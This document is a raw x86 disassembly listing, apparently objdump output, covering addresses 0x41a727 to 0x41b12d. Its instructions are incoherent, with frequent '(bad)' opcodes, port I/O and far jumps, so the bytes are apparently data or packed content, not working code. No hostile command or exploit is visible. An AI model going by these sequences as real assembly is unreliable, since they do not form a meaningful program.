  41a727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a728:	adc    bh,BYTE PTR ds:0xdedf8bff
  41a72e:	fwait
  41a72f:	add    al,0x78
  41a731:	jb     0x41a757
  41a733:	pop    edi
  41a734:	sub    al,BYTE PTR [eax]
	...
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx-0x6a88af58]
  41a7a4:	dec    edx
  41a7a5:	mov    dl,0xd7
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [eax+0x14],dh
  41a7b0:	mov    cl,0xa4
  41a7b2:	jo     0x41a822
  41a7b4:	sub    DWORD PTR [ebp-0x3c50b52b],ebp
  41a7ba:	push   0x705a46a
  41a7bf:	xchg   edi,eax
  41a7c0:	scas   eax,DWORD PTR es:[edi]
  41a7c1:	icebp  
  41a7c2:	out    dx,eax
  41a7c3:	cs sti 
  41a7c5:	enter  0x333d,0xa9
  41a7c9:	and    BYTE PTR [esi+0x7e09324a],ah
  41a7cf:	in     eax,0xa5
  41a7d1:	sbb    DWORD PTR [ecx],ebx
  41a7d3:	or     al,0xa
  41a7d5:	fmul   DWORD PTR [edi+0x2b]
  41a7d8:	int3   
  41a7d9:	inc    ecx
  41a7da:	pop    ss
  41a7db:	gs repz inc ebx
  41a7de:	push   ss
  41a7df:	and    DWORD PTR [edx-0x4680008],ecx
  41a7e5:	in     eax,dx
  41a7e6:	aad    0x7e
  41a7e8:	popa   
  41a7e9:	adc    DWORD PTR cs:[eax],esp
  41a7ec:	mov    dl,0x43
  41a7ee:	fwait
  41a7ef:	scas   eax,DWORD PTR es:[edi]
  41a7f0:	mov    bl,0xf5
  41a7f2:	(bad)  
  41a7f3:	xchg   esp,eax
  41a7f4:	mov    cl,0xc1
  41a7f6:	std    
  41a7f7:	(bad)  
  41a7f8:	mov    gs,WORD PTR [eax-0x1715dbc5]
  41a7fe:	xor    eax,0x1577316e
  41a803:	cld    
  41a804:	lods   eax,DWORD PTR ds:[esi]
  41a805:	ins    BYTE PTR es:[edi],dx
  41a806:	push   edi
  41a807:	fwait
  41a808:	ror    DWORD PTR [edi-0x6a],1
  41a80b:	ror    BYTE PTR [edi],0x49
  41a80e:	mov    dl,0x8
  41a810:	mov    esi,0x73bc5223
  41a815:	dec    ebp
  41a816:	test   ebx,ebx
  41a818:	outs   dx,DWORD PTR ds:[esi]
  41a819:	shl    BYTE PTR [eax+edi*8-0x4d],0xb
  41a81e:	mov    cl,bl
  41a820:	inc    eax
  41a821:	test   al,0x81
  41a823:	repz les ebp,FWORD PTR [ebp+0x22]
  41a827:	jns    0x41a869
  41a829:	fsubr  QWORD PTR ds:[eax-0x702f5a69]
  41a830:	cmp    al,0xf1
  41a832:	test   eax,0x1d0a9883
  41a837:	push   es
  41a838:	mov    edi,ss
  41a83a:	fidiv  WORD PTR [esi]
  41a83c:	stc    
  41a83d:	cmp    al,0x25
  41a83f:	jp     0x41a7f2
  41a841:	lds    ecx,FWORD PTR ss:[edi+0x55]
  41a845:	sub    al,0x3a
  41a847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a848:	mov    dh,0xa7
  41a84a:	inc    eax
  41a84b:	sti    
  41a84c:	test   DWORD PTR [ebx+ebp*1],ebp
  41a84f:	rcl    DWORD PTR [ebx-0x29],1
  41a852:	sub    ebp,DWORD PTR [edx-0x67823d4d]
  41a858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a859:	add    edx,DWORD PTR ds:0x26b7a684
  41a85f:	push   es
  41a860:	jb     0x41a7fa
  41a862:	sbb    BYTE PTR [esi],ch
  41a864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a865:	push   ecx
  41a866:	add    cl,BYTE PTR ds:0x4114789d
  41a86c:	pop    eax
  41a86d:	les    ebx,FWORD PTR [esp+edi*1-0x7f]
  41a871:	mov    dl,0xa2
  41a873:	arpl   dx,ax
  41a875:	mov    ds:0x9d327680,eax
  41a87a:	xor    eax,0x1c29d629
  41a87f:	cmovle ecx,DWORD PTR [edi]
  41a882:	(bad)  
  41a883:	xlat   BYTE PTR ds:[ebx]
  41a884:	or     eax,0xfdb72ad0
  41a889:	push   eax
  41a88a:	adc    cl,BYTE PTR [eax+0x33]
  41a88d:	or     al,BYTE PTR [esi]
  41a88f:	dec    eax
  41a890:	(bad)  [esi+0x21]
  41a893:	cmp    dl,bl
  41a895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a896:	mov    ecx,0x9b912b0d
  41a89b:	jmp    DWORD PTR [ebp+0x6ea5d303]
  41a8a1:	pop    esp
  41a8a2:	sbb    BYTE PTR es:[eax-0xf],dh
  41a8a6:	sub    DWORD PTR [ecx],eax
  41a8a8:	mov    dh,0x9e
  41a8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ab:	mov    ss,WORD PTR [ecx+0x610424d7]
  41a8b1:	mov    ds:0x596fcd,eax
	...
  41a916:	xor    eax,0xcf4a867e
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x1480323e,al
  41a924:	jl     0x41a933
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [esi],dh
  41a92f:	pop    edi
  41a930:	scas   al,BYTE PTR es:[edi]
  41a931:	or     al,0x6
  41a933:	sub    DWORD PTR [edi+0xd],0xb78a9fe0
  41a93a:	jmp    0x2f50d858
  41a93f:	inc    edx
  41a940:	push   esp
  41a941:	rcl    esi,1
  41a943:	(bad)  
  41a944:	ss sti 
  41a946:	cmp    DWORD PTR [esi+esi*1+0x5],eax
  41a94a:	cmp    ah,BYTE PTR [eax+0x7e9fe90c]
  41a950:	inc    ebx
  41a951:	ret    0x94d8
  41a954:	mov    ecx,0x197976b7
  41a959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a95a:	rcr    BYTE PTR [edi-0x6cece7a5],1
  41a960:	inc    ebx
  41a961:	dec    esi
  41a962:	leave  
  41a963:	pop    ds
  41a964:	inc    DWORD PTR [ebx-0x2be4f530]
  41a96a:	aaa    
  41a96b:	or     BYTE PTR [esi],0x32
  41a96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a96f:	inc    esi
  41a970:	jg     0x41a9ec
  41a972:	cld    
  41a973:	or     BYTE PTR [edx],bh
  41a975:	adc    cl,cl
  41a977:	xor    ebp,edx
  41a979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a97a:	pop    es
  41a97b:	jbe    0x41a90e
  41a97d:	push   es
  41a97e:	xchg   esp,eax
  41a97f:	xchg   edi,eax
  41a980:	push   eax
  41a981:	(bad)  
  41a982:	in     al,0x45
  41a984:	push   ds
  41a985:	ret    0xa7f7
  41a988:	sbb    bh,BYTE PTR [esi-0x6233ef04]
  41a98e:	std    
  41a98f:	iret   
  41a990:	fld    QWORD PTR [edx]
  41a992:	dec    ecx
  41a993:	lea    ebx,[edx]
  41a995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a996:	iret   
  41a997:	mov    dh,0x53
  41a999:	leave  
  41a99a:	xchg   esi,eax
  41a99b:	rol    edx,0xda
  41a99e:	add    cl,BYTE PTR [esp+eiz*4]
  41a9a1:	or     al,0x1c
  41a9a3:	leave  
  41a9a4:	pushf  
  41a9a5:	cli    
  41a9a6:	(bad)  
  41a9a7:	pop    ecx
  41a9a8:	xchg   ecx,eax
  41a9a9:	in     eax,dx
  41a9aa:	jp     0x41a95a
  41a9ac:	sbb    al,0xb9
  41a9ae:	aad    0x7
  41a9b0:	push   0xffffffc8
  41a9b2:	jbe    0x41a93d
  41a9b4:	adc    al,0x2
  41a9b6:	fwait
  41a9b7:	(bad)  
  41a9b8:	mov    ebx,0x91e038ef
  41a9bd:	stos   DWORD PTR es:[edi],eax
  41a9be:	pushf  
  41a9bf:	jmp    0xabe6:0x20603bf7
  41a9c6:	cmp    BYTE PTR [esi-0x44],dl
  41a9c9:	mov    dx,0x1057
  41a9cd:	je     0x41a94f
  41a9cf:	inc    ebx
  41a9d0:	fcmovnb st,st(7)
  41a9d2:	cs push ds
  41a9d4:	bound  edx,QWORD PTR [ecx+ebp*4]
  41a9d7:	(bad)  
  41a9d8:	mov    ss,WORD PTR [ebx-0x7226668f]
  41a9de:	sahf   
  41a9df:	mov    cl,0x30
  41a9e1:	mov    eax,ds:0x785e7146
  41a9e6:	loope  0x41aa25
  41a9e8:	mov    bl,0x1f
  41a9ea:	mov    ecx,cs
  41a9ec:	cmp    edx,edx
  41a9ee:	mov    ds:0xe8ba30fe,al
  41a9f3:	mov    ecx,0x15e0d9f2
  41a9f8:	or     al,0x84
  41a9fa:	dec    ebp
  41a9fb:	jg     0x41a998
  41a9fd:	stc    
  41a9fe:	inc    esi
  41a9ff:	and    eax,0x430e456f
  41aa04:	cmp    cl,ah
  41aa06:	mov    ds:0xa493d6f8,al
  41aa0b:	int3   
  41aa0c:	xlat   BYTE PTR ds:[ebx]
  41aa0d:	out    dx,al
  41aa0e:	cwde   
  41aa0f:	fisub  WORD PTR [ecx-0x131f7ce4]
  41aa15:	xchg   ecx,eax
  41aa16:	lds    esi,FWORD PTR [esi]
  41aa18:	loope  0x41aa31
  41aa1a:	(bad)  
  41aa1b:	out    0xb8,eax
  41aa1d:	ja     0x41aa60
  41aa1f:	call   0x3571810
  41aa24:	imul   BYTE PTR [edx]
  41aa26:	mov    bl,0xdf
  41aa28:	pop    ebx
  41aa29:	bound  edx,QWORD PTR [eax+0x176350f5]
  41aa2f:	fadd   DWORD PTR [ebx-0x3150aa93]
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x674ee277,al
  41aaa4:	mov    WORD PTR [ecx],es
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [edi+0x33ef7f0d],dl
  41aab3:	int    0x67
  41aab5:	add    eax,0xdd26eba6
  41aaba:	repz pop ds
  41aabc:	xchg   BYTE PTR [ecx],ch
  41aabe:	or     cl,dh
  41aac0:	dec    esp
  41aac1:	gs push esi
  41aac3:	(bad)  
  41aac4:	cmp    ecx,DWORD PTR [ebx-0x30]
  41aac7:	bound  bx,DWORD PTR [eax+0x4c]
  41aacb:	add    ah,ch
  41aacd:	mov    BYTE PTR ds:0x34bcc920,ch
  41aad3:	and    eax,0x1ed0608
  41aad8:	jbe    0x41ab44
  41aada:	scas   al,BYTE PTR es:[edi]
  41aadb:	and    ebx,DWORD PTR [edx-0x20]
  41aade:	mov    edi,DWORD PTR [esp+eiz*4-0x5b]
  41aae2:	push   0x694490b6
  41aae7:	mov    ds:0x8a8d61d6,al
  41aaec:	mov    ss,esp
  41aaee:	sub    DWORD PTR [edi-0x62832352],edi
  41aaf4:	push   ds
  41aaf5:	xchg   edi,edx
  41aaf7:	mov    esp,0xe98f6c6e
  41aafc:	clc    
  41aafd:	or     ah,BYTE PTR [ebp+0x68ff22de]
  41ab03:	and    eax,0x7896a7ef
  41ab08:	and    BYTE PTR [ebx+0x43f05452],dl
  41ab0e:	mov    cl,0x4
  41ab10:	es push esi
  41ab12:	xchg   BYTE PTR [esi+0x2aaf54eb],dh
  41ab18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab19:	outs   dx,DWORD PTR ds:[esi]
  41ab1a:	jno    0x41ab09
  41ab1c:	mov    WORD PTR [edx],es
  41ab1e:	sub    ecx,DWORD PTR [ebp+0x111c3b70]
  41ab24:	loopne 0x41ab7e
  41ab26:	dec    esi
  41ab27:	cmp    al,0x44
  41ab29:	push   eax
  41ab2a:	fst    QWORD PTR [eax+0x65]
  41ab2d:	test   al,0xd4
  41ab2f:	rol    BYTE PTR [edi-0x69],cl
  41ab32:	add    eax,0x1897cd0a
  41ab37:	or     dh,bh
  41ab39:	adc    al,0x9e
  41ab3b:	fistp  DWORD PTR [esi+eax*2-0x723f6273]
  41ab42:	push   esp
  41ab43:	push   ecx
  41ab44:	(bad)  
  41ab45:	stc    
  41ab46:	imul   eax,DWORD PTR [edi+ecx*8],0xfd7e47d7
  41ab4d:	outs   dx,BYTE PTR ds:[esi]
  41ab4e:	inc    esi
  41ab4f:	in     eax,dx
  41ab50:	out    dx,eax
  41ab51:	add    cl,0xf0
  41ab54:	les    eax,FWORD PTR [edi]
  41ab56:	push   0xffffffa4
  41ab58:	pop    es
  41ab59:	push   edx
  41ab5a:	add    BYTE PTR [eax],0xa9
  41ab5d:	mov    edi,0x5013689a
  41ab62:	iret   
  41ab63:	jns    0x41abb4
  41ab65:	loop   0x41abbc
  41ab67:	ja     0x41abbd
  41ab69:	mov    ecx,0x486e9a41
  41ab6e:	jp     0x41aaf7
  41ab70:	mov    edi,0x8a67c8ce
  41ab75:	dec    esp
  41ab76:	call   DWORD PTR [ecx-0x30]
  41ab79:	pop    edi
  41ab7a:	stc    
  41ab7b:	fnstenv [edi]
  41ab7d:	rcr    BYTE PTR [ecx-0x47],cl
  41ab80:	mov    ebx,0x766ab820
  41ab85:	or     ch,BYTE PTR [edi+0x5345f32e]
  41ab8b:	mov    dl,0x80
  41ab8d:	jns    0x41ab5f
  41ab8f:	popa   
  41ab90:	fwait
  41ab91:	(bad)  
  41ab92:	repz xchg esp,eax
  41ab94:	xor    al,0x71
  41ab96:	mov    eax,DWORD PTR [eax]
  41ab98:	pop    ss
  41ab99:	lea    ecx,[esi-0x77]
  41ab9c:	jp     0x41ac01
  41ab9e:	mov    eax,0xd6a10ff2
  41aba3:	add    DWORD PTR [ecx],edi
  41aba5:	jecxz  0x41ac0c
  41aba7:	adc    bh,bh
  41aba9:	xchg   DWORD PTR [edx+0x4],edi
  41abac:	jmp    0x7e24:0x3d102e71
  41abb3:	cmp    dh,al
	...
  41ac15:	add    BYTE PTR [edx+0x49],ch
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0xc54cc53
  41ac24:	jb     0x41ac8a
  41ac26:	in     al,dx
  41ac27:	sbb    DWORD PTR [ecx],eax
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    dh,dh
  41ac2f:	inc    eax
  41ac30:	mov    esp,0x38cb751c
  41ac35:	loopne 0x41ac3a
  41ac37:	xchg   ebx,eax
  41ac38:	repz or ebp,DWORD PTR [edi+0x8]
  41ac3c:	xchg   ecx,eax
  41ac3d:	jbe    0x41ac81
  41ac3f:	cmc    
  41ac40:	fnstcw WORD PTR [ecx+0x1a3fff11]
  41ac46:	aad    0xf0
  41ac48:	sub    BYTE PTR [ecx],0xb0
  41ac4b:	xor    al,0xd
  41ac4d:	sbb    al,0x5
  41ac4f:	push   0x18
  41ac51:	sub    esi,DWORD PTR [edx]
  41ac53:	cmp    DWORD PTR [esi+ebp*8],ebx
  41ac56:	fimul  WORD PTR [eax-0x7d1b1612]
  41ac5c:	mov    esp,0x53f1966d
  41ac61:	pop    ebp
  41ac62:	or     dh,0xc9
  41ac65:	inc    ebx
  41ac66:	adc    cl,bl
  41ac68:	pop    ds
  41ac69:	mov    bl,0x5a
  41ac6b:	push   esi
  41ac6c:	pop    ebp
  41ac6d:	push   edx
  41ac6e:	loope  0x41ac26
  41ac70:	xchg   esi,ebp
  41ac72:	lea    esi,[esi]
  41ac74:	add    edx,DWORD PTR [esi-0x43193746]
  41ac7a:	cld    
  41ac7b:	push   es
  41ac7c:	mov    ah,0xa5
  41ac7e:	dec    edx
  41ac7f:	js     0x41acda
  41ac81:	push   ss
  41ac82:	push   ebx
  41ac83:	xor    eax,esi
  41ac85:	pop    ebp
  41ac86:	jnp    0x41ac88
  41ac88:	jbe    0x41acbd
  41ac8a:	push   ecx
  41ac8b:	inc    ebp
  41ac8c:	clc    
  41ac8d:	add    eax,ebp
  41ac8f:	and    ecx,DWORD PTR [esp+edx*4-0x1b760aff]
  41ac96:	in     eax,dx
  41ac97:	(bad)  
  41ac98:	fadd   st,st(5)
  41ac9a:	cmp    ecx,DWORD PTR [ebp-0x4b45a843]
  41aca0:	shr    ebx,cl
  41aca2:	es ja  0x41acfe
  41aca5:	outs   dx,BYTE PTR ds:[esi]
  41aca6:	pop    ss
  41aca7:	outs   dx,DWORD PTR ds:[esi]
  41aca8:	inc    ecx
  41aca9:	mov    ds:0xf512c1b0,al
  41acae:	and    dh,BYTE PTR [ebx+0xf243463]
  41acb4:	sub    dh,BYTE PTR [ebp+0x33]
  41acb7:	pop    edi
  41acb8:	jecxz  0x41ad13
  41acba:	mov    al,BYTE PTR [ebp+0x681aba4d]
  41acc0:	jmp    0x8492:0x8fef72d8
  41acc7:	push   esi
  41acc8:	sbb    BYTE PTR [ebx],bh
  41acca:	mov    dh,0xf6
  41accc:	pop    esi
  41accd:	dec    edi
  41acce:	jb     0x41ad40
  41acd0:	imul   eax,DWORD PTR [ecx+0x168761f],0xffffffc2
  41acd7:	repz test al,0xcb
  41acda:	cdq    
  41acdb:	aad    0xd3
  41acdd:	aad    0x6
  41acdf:	scas   al,BYTE PTR es:[edi]
  41ace0:	call   0xfdea:0x7cd2f031
  41ace7:	nop
  41ace8:	aaa    
  41ace9:	hlt    
  41acea:	mov    eax,ds:0xde03ca2b
  41acef:	fstp   QWORD PTR [ebx+ecx*1+0x61a4bf5b]
  41acf6:	ficom  DWORD PTR [edx-0x2a]
  41acf9:	repnz sub edi,DWORD PTR [ebp-0x5a]
  41acfd:	enter  0x1b58,0x51
  41ad01:	jl     0x41ad37
  41ad03:	fcomp  QWORD PTR ds:0x6a8b399
  41ad09:	ja     0x41acd1
  41ad0b:	fcom   DWORD PTR [edx+0x31114a06]
  41ad11:	mov    dl,0x30
  41ad13:	pop    edi
  41ad14:	imul   ebx,DWORD PTR [eax+0x479e4e23],0xd134cf36
  41ad1e:	cmp    eax,0x95bbfe23
  41ad23:	repz xor ebp,DWORD PTR [esi-0x9ad2a29]
  41ad2a:	adc    ch,ah
  41ad2c:	retf   0xcfa0
  41ad2f:	mov    ds:0xe6e548bf,al
  41ad34:	std    
	...
  41ad95:	add    BYTE PTR [ebp-0x8],dl
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    eax,DWORD PTR [edi]
  41ada3:	int3   
  41ada4:	push   ecx
  41ada5:	(bad)  
  41ada6:	repz sbb al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [ecx-0x1bbedaa],ah
  41adb3:	les    eax,FWORD PTR [eax-0x59f8836e]
  41adb9:	fucomip st,st(1)
  41adbb:	pop    esi
  41adbc:	mov    gs,WORD PTR [ebx-0x19]
  41adbf:	ficomp DWORD PTR [ebx]
  41adc1:	mov    edx,0xf4b8d13d
  41adc6:	sub    DWORD PTR [eax],ebp
  41adc8:	pop    ebx
  41adc9:	sub    al,0x6
  41adcb:	jo     0x41ad58
  41adcd:	arpl   WORD PTR [edi-0x698e11ef],cx
  41add3:	pop    ss
  41add4:	das    
  41add5:	dec    edx
  41add6:	fsub   DWORD PTR [ecx+ebp*8+0x68ad9cc7]
  41addd:	pop    ebx
  41adde:	mov    eax,0xc8a6bdc3
  41ade3:	call   0x741a7f5d
  41ade8:	jl     0x41addd
  41adea:	int    0xa2
  41adec:	mov    esp,0x138477d6
  41adf1:	idiv   eax
  41adf3:	pushf  
  41adf4:	out    dx,al
  41adf5:	into   
  41adf6:	jbe    0x41ae5c
  41adf8:	data16 shl ah,1
  41adfb:	dec    ebx
  41adfc:	sbb    al,0x67
  41adfe:	mov    dl,0xb6
  41ae00:	(bad)  
  41ae01:	int    0xc2
  41ae03:	sub    dh,BYTE PTR [ebx]
  41ae05:	inc    edx
  41ae06:	shl    DWORD PTR [edx+0x4b],cl
  41ae09:	popa   
  41ae0a:	sub    ch,BYTE PTR [edi+esi*8+0x3d]
  41ae0e:	add    DWORD PTR [ecx+0x6b8b955],eax
  41ae14:	sti    
  41ae15:	mov    dl,0xf0
  41ae17:	fiadd  DWORD PTR [ebp+0x4464ded8]
  41ae1d:	cmp    al,BYTE PTR es:[eax-0x7c42def9]
  41ae24:	push   ebp
  41ae25:	mov    edx,0x96fbfbcd
  41ae2a:	or     ebp,esi
  41ae2c:	adc    BYTE PTR [ebx-0x32],0x3f
  41ae30:	outs   dx,BYTE PTR ds:[esi]
  41ae31:	loopne 0x41aea2
  41ae33:	stc    
  41ae34:	or     BYTE PTR es:[eax+0x7d],cl
  41ae38:	mov    cl,0x9
  41ae3a:	bound  eax,QWORD PTR [edi-0x10c80fbf]
  41ae40:	xchg   ah,bl
  41ae42:	fwait
  41ae43:	sub    bl,BYTE PTR [ebp-0x7461f767]
  41ae49:	into   
  41ae4a:	jbe    0x41aecb
  41ae4c:	or     BYTE PTR [edx-0x42],bh
  41ae4f:	jg     0x41adda
  41ae51:	dec    ecx
  41ae52:	imul   eax,DWORD PTR [edi-0x1e],0x7fdee93a
  41ae59:	and    bh,BYTE PTR [edi-0x8bc2132]
  41ae5f:	outs   dx,DWORD PTR ds:[esi]
  41ae60:	xor    ch,BYTE PTR [edi+0x185b3a1b]
  41ae66:	in     al,dx
  41ae67:	in     al,0xfb
  41ae69:	jnp    0x41ae35
  41ae6b:	popf   
  41ae6c:	push   esp
  41ae6d:	mov    edx,0x9ec7d365
  41ae72:	pop    ss
  41ae73:	clc    
  41ae74:	mov    esi,0xbc79f59e
  41ae79:	mov    eax,0x36f8c41
  41ae7e:	push   esp
  41ae7f:	or     BYTE PTR [ebp+0x69b2108f],0xa0
  41ae86:	adc    ch,0x99
  41ae89:	cmp    eax,DWORD PTR ds:0xcd5e9235
  41ae8f:	lods   al,BYTE PTR ds:[esi]
  41ae90:	int3   
  41ae91:	popf   
  41ae92:	test   BYTE PTR [ecx],dl
  41ae94:	dec    edi
  41ae95:	add    DWORD PTR [ebp+0x1fa87887],ebx
  41ae9b:	loopne 0x41ae65
  41ae9d:	xor    ch,dl
  41ae9f:	inc    esi
  41aea0:	repnz hlt 
  41aea2:	inc    ebp
  41aea3:	pop    esp
  41aea4:	and    al,0xa6
  41aea6:	test   DWORD PTR [edi+esi*2],ecx
  41aea9:	add    eax,0xfa16ea1a
  41aeae:	or     al,0xc1
  41aeb0:	and    al,0xba
  41aeb2:	mov    bh,0xa9
  41aeb4:	in     eax,dx
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af2f
  41af23:	mov    ebp,0x11bfac4
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [esi],cl
  41af2f:	mov    ch,BYTE PTR [ecx+ecx*4-0x76]
  41af33:	(bad)  
  41af35:	pop    eax
  41af36:	loopne 0x41aec4
  41af38:	clc    
  41af39:	enter  0xb16e,0x6b
  41af3d:	pop    ebx
  41af3e:	mov    ch,0x4c
  41af40:	bt     esp,esp
  41af43:	push   esp
  41af44:	rcl    BYTE PTR [ebx-0x28],cl
  41af47:	mov    eax,0xc451033e
  41af4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4d:	outs   dx,BYTE PTR ds:[esi]
  41af4e:	jmp    0x4474b381
  41af53:	push   esp
  41af54:	or     BYTE PTR [edx],cl
  41af56:	lods   eax,DWORD PTR ds:[esi]
  41af57:	add    al,0xb9
  41af59:	gs call 0xfb8062f9
  41af5f:	jmp    0x41af28
  41af61:	popf   
  41af62:	cmp    al,BYTE PTR [eax-0xb]
  41af65:	dec    ebx
  41af66:	and    edi,DWORD PTR [esi]
  41af68:	jbe    0x41af63
  41af6a:	pop    eax
  41af6b:	js     0x41afc0
  41af6d:	xor    al,0x84
  41af6f:	jb     0x41af3a
  41af71:	fstp   DWORD PTR [ecx-0x39ec6459]
  41af77:	xor    dl,cl
  41af79:	sub    cl,BYTE PTR [edi+0x1051c399]
  41af7f:	xor    eax,0x71cf2e0c
  41af84:	inc    ebx
  41af85:	jbe    0x41af62
  41af87:	jge    0x41afb6
  41af89:	inc    ecx
  41af8a:	enter  0xb6ee,0xc5
  41af8e:	cld    
  41af8f:	pop    ss
  41af90:	xlat   BYTE PTR ds:[ebx]
  41af91:	push   es
  41af92:	outs   dx,BYTE PTR ds:[esi]
  41af93:	and    al,0x9c
  41af95:	xchg   esp,eax
  41af96:	push   esp
  41af97:	rol    DWORD PTR [ebx+0x2bc1773],1
  41af9d:	xor    ebp,DWORD PTR es:[edx]
  41afa0:	fnstcw WORD PTR [edx-0x15c71aec]
  41afa6:	push   edx
  41afa7:	sbb    ah,BYTE PTR [eax-0x19]
  41afaa:	jbe    0x41aff7
  41afac:	mov    eax,ds:0x5abaa292
  41afb1:	dec    esp
  41afb2:	leave  
  41afb3:	retf   0xafad
  41afb6:	add    edi,DWORD PTR [ebp+0x76]
  41afb9:	test   eax,0x505889ab
  41afbe:	xor    esi,ebx
  41afc0:	(bad)  
  41afc1:	and    ecx,DWORD PTR fs:0x987bc7b0
  41afc8:	adc    DWORD PTR [eax-0x79],esp
  41afcb:	dec    bh
  41afcd:	or     eax,0xb291c6d9
  41afd2:	or     esi,DWORD PTR [ebx-0xf64d6c0]
  41afd8:	xor    al,BYTE PTR [esp+eiz*8+0x5b410bdd]
  41afdf:	inc    esp
  41afe0:	mov    bh,0x18
  41afe2:	outs   dx,DWORD PTR ds:[esi]
  41afe3:	dec    BYTE PTR [ecx-0xee706e8]
  41afe9:	ins    BYTE PTR es:[edi],dx
  41afea:	xchg   esi,eax
  41afeb:	and    BYTE PTR [ebx-0x19e6f3af],cl
  41aff1:	and    al,0xaf
  41aff3:	in     eax,dx
  41aff4:	push   ebx
  41aff5:	sbb    eax,0xa7b8524b
  41affa:	test   eax,0x62ef73a6
  41afff:	iret   
  41b000:	loope  0x41b064
  41b002:	jne    0x41b011
  41b004:	repnz pop ecx
  41b006:	icebp  
  41b007:	addr16 cdq 
  41b009:	push   edi
  41b00a:	cmc    
  41b00b:	jns    0x41b01a
  41b00d:	fisttp DWORD PTR [esi+0x121ee6bd]
  41b013:	add    al,0xd5
  41b015:	jne    0x41b012
  41b017:	inc    ebx
  41b018:	std    
  41b019:	jp     0x41b07d
  41b01b:	push   ecx
  41b01c:	mov    ss,WORD PTR [edi-0x2b]
  41b01f:	mov    DWORD PTR [ecx+0x307d8b1d],eax
  41b025:	cmp    dl,BYTE PTR [eax-0xacc24b8]
  41b02b:	pop    ss
  41b02c:	jp     0x41b083
  41b02e:	inc    ecx
  41b02f:	mov    dl,BYTE PTR [edi+0x40]
  41b032:	sbb    DWORD PTR [edi-0x1b],edx
	...
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi+0x7ad9ab31]
  41b0a5:	mov    cl,0x1
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	(bad)  
  41b0af:	mov    cl,0x73
  41b0b1:	call   0xd88eec54
  41b0b6:	scas   eax,DWORD PTR es:[edi]
  41b0b7:	push   es
  41b0b8:	sub    eax,0xdaeb8683
  41b0bd:	ds xchg edi,eax
  41b0bf:	call   0x5ce992e3
  41b0c4:	(bad)  
  41b0c5:	mov    ecx,0xcac917a3
  41b0ca:	jp     0x41b060
  41b0cc:	push   ss
  41b0cd:	push   edi
  41b0ce:	sbb    esp,0xffffffc6
  41b0d1:	aam    0x4e
  41b0d3:	and    al,0xb1
  41b0d5:	jo     0x41b0f6
  41b0d7:	clc    
  41b0d8:	cmp    DWORD PTR [ebx-0x57622ddf],0x17481571
  41b0e2:	jns    0x41b14f
  41b0e4:	fist   WORD PTR [ebx+0x5b]
  41b0e7:	rcl    BYTE PTR [ebp+0x4d],cl
  41b0ea:	and    DWORD PTR [ecx+ecx*4-0x6],edx
  41b0ee:	pop    eax
  41b0ef:	cmp    ecx,DWORD PTR [ebx-0x6c]
  41b0f2:	mov    ds:0x1e8e3c6d,al
  41b0f7:	pop    ss
  41b0f8:	xor    BYTE PTR [edx],ah
  41b0fa:	xchg   BYTE PTR [ebx+edi*2-0x31],dl
  41b0fe:	adc    eax,0x99c0d327
  41b103:	pop    es
  41b104:	sar    BYTE PTR [edi+0x77],0xb9
  41b108:	push   ebp
  41b109:	call   0x5008:0x7ab2
  41b10f:	test   BYTE PTR [ebp*1+0x4e4090c6],dl
  41b116:	add    al,0x32
  41b118:	cmp    eax,0xeb9231ac
  41b11d:	nop
  41b11e:	dec    eax
  41b11f:	dec    esi
  41b120:	push   esi
  41b121:	push   ss
  41b122:	repnz cmp dh,bl
  41b125:	xor    bl,BYTE PTR [ebx-0x73]
  41b128:	mov    ah,0xe3
  41b12a:	cmp    BYTE PTR [esi-0x27],bh
  41b12d:	mul    BYTE PTR [esi-0x19]
